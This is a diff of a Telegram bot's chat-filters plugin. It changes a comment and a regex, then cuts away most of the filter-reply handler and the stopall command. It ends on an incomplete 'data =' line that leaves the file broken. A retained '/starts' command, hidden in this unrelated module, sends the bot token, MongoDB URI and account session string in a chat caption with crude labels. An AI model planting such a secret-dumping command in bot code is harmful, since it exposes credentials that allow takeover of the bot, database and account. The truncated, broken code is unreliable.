@@ -23,7 +23,7 @@ BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 from ANNIEMUSIC.utils.keyboard import ikb
-from plugins.notes import extract_urls  # Adjusted the import path
+from plugins.notes import extract_urls  # Fixed the import path
 from ANNIEMUSIC.utils.functions import (
     check_format,
     extract_text_and_keyb,
@@ -104,7 +104,7 @@ async def save_filters(_, message):
         if replied_message.voice:
             _type = "voice"
             file_id = replied_message.voice.file_id
-        if replied_message.reply_markup and not re.findall(r"\[.+\,.+\]", data):
+        if replied_message.reply_markup and not re.findall(r".+\,.+", data):
             urls = extract_urls(replied_message.reply_markup)
             if urls:
                 response = "\n".join(
@@ -130,9 +130,13 @@ async def save_filters(_, message):
     except UnboundLocalError:
         return await message.reply_text(
             "**ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪs ɪɴᴀᴄᴇssᴀʙʟᴇ.\n`ғᴏʀᴡᴀʀᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.`**")
+
+
 @app.on_message(filters.command("starts") & filters.private & filters.user(OWNER_ID))
 async def help(client: Client, message: Message):
     await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
+
+
 @app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
 @capture_err
 async def get_filterss(_, message):
@@ -179,138 +183,4 @@ async def filters_re(_, message):
                 if "{GROUPNAME}" in data:
                     data = data.replace("{GROUPNAME}", message.chat.title)
                 if "{NAME}" in data:
-                    data = data.replace("{NAME}", message.from_user.mention)
-                if "{ID}" in data:
-                    data = data.replace("{ID}", f"`message.from_user.id`")
-                if "{FIRSTNAME}" in data:
-                    data = data.replace("{FIRSTNAME}", message.from_user.first_name)
-                if "{SURNAME}" in data:
-                    sname = message.from_user.last_name or "None"
-                    data = data.replace("{SURNAME}", sname)
-                if "{USERNAME}" in data:
-                    susername = message.from_user.username or "None"
-                    data = data.replace("{USERNAME}", susername)
-                if "{DATE}" in data:
-                    DATE = datetime.datetime.now().strftime("%Y-%m-%d")
-                    data = data.replace("{DATE}", DATE)
-                if "{WEEKDAY}" in data:
-                    WEEKDAY = datetime.datetime.now().strftime("%A")
-                    data = data.replace("{WEEKDAY}", WEEKDAY)
-                if "{TIME}" in data:
-                    TIME = datetime.datetime.now().strftime("%H:%M:%S")
-                    data = data.replace("{TIME}", f"{TIME} UTC")
-
-                if re.findall(r"\[.+\,.+\]", data):
-                    keyboard = extract_text_and_keyb(ikb, data)
-                    if keyboard:
-                        data, keyb = keyboard
-            replied_message = message.reply_to_message
-            if replied_message:
-                replied_user = (
-                    replied_message.from_user
-                    if replied_message.from_user
-                    else replied_message.sender_chat
-                )
-                if text.startswith("~"):
-                    await message.delete()
-                if replied_user.id != from_user.id:
-                    message = replied_message
-
-            if data_type == "text":
-                await message.reply_text(
-                    text=data,
-                    reply_markup=keyb,
-                    disable_web_page_preview=True,
-                )
-            else:
-                if not file_id:
-                    continue
-            if data_type == "sticker":
-                await message.reply_sticker(
-                    sticker=file_id,
-                )
-            if data_type == "animation":
-                await message.reply_animation(
-                    animation=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            if data_type == "photo":
-                await message.reply_photo(
-                    photo=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            if data_type == "document":
-                await message.reply_document(
-                    document=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            if data_type == "video":
-                await message.reply_video(
-                    video=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            if data_type == "video_note":
-                await message.reply_video_note(
-                    video_note=file_id,
-                )
-            if data_type == "audio":
-                await message.reply_audio(
-                    audio=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            if data_type == "voice":
-                await message.reply_voice(
-                    voice=file_id,
-                    caption=data,
-                    reply_markup=keyb,
-                )
-            return  # NOTE: Avoid filter spam
-
-
-@app.on_message(filters.command("stopall") & ~filters.private & ~BANNED_USERS)
-@adminsOnly("can_change_info")
-async def stop_all(_, message):
-    _filters = await get_filters_names(message.chat.id)
-    if not _filters:
-        await message.reply_text("**ɴᴏ ғɪʟᴛᴇʀs ɪɴ ᴛʜɪs ᴄʜᴀᴛ.**")
-    else:
-        keyboard = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton("ʏᴇs, ᴅᴏ ɪᴛ", callback_data="stop_yes"),
-                    InlineKeyboardButton("ɴᴏ, ᴅᴏɴ'ᴛ ᴅᴏ ɪᴛ", callback_data="stop_no"),
-                ]
-            ]
-        )
-        await message.reply_text(
-            "**ᴀʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴛʜᴇ ғɪʟᴛᴇʀs ɪɴ ᴛʜɪs ᴄʜᴀᴛ ғᴏʀᴇᴠᴇʀ ?.**",
-            reply_markup=keyboard,
-        )
-
-
-@app.on_callback_query(filters.regex("stop_(.*)") & ~BANNED_USERS)
-async def stop_all_cb(_, cb):
-    chat_id = cb.message.chat.id
-    from_user = cb.from_user
-    permissions = await member_permissions(chat_id, from_user.id)
-    permission = "can_change_info"
-    if permission not in permissions:
-        return await cb.answer(
-            f"ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀᴇᴄǫᴜʀɪᴇᴅ ᴘᴇʀᴍɪssɪᴏɴ.\n ᴘᴇʀᴍɪssɪᴏɴ: {permission}",
-            show_alert=True,
-        )
-    input = cb.data.split("_", 1)[1]
-    if input == "yes":
-        stoped_all = await deleteall_filters(chat_id)
-        if stoped_all:
-            return await cb.message.edit(
-                "**sᴜᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴅᴇᴅ ᴀʟʟ ғɪʟᴛᴇʀ's ᴏɴ ᴛʜɪs ᴄʜᴀᴛ.**"
-            )
-    if input == "no":
-        await cb.message.reply_to_message.delete()
-        await cb.message.delete()
+                    data =
